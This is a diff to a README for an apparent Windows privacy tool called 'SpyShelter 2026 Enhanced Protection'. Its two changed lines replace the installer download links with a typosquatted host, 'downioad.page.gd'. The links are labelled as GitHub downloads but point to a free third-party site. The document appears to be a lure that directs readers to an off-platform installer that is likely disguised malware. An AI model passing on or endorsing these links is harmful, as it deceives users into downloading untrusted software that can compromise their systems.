@@ -2,7 +2,7 @@
 
 SpyShelter 2026 Enhanced Protection is a powerful desktop application designed for Windows 10 and 11, offering robust safeguards against unauthorized monitoring and data threats. This tool integrates advanced privacy controls to keep your system secure in 2026 and beyond.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -41,7 +41,7 @@ SpyShelter 2026 uses non-intrusive monitoring techniques that focus on system-le
 
 To get the latest version, visit the official download page:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ---
 
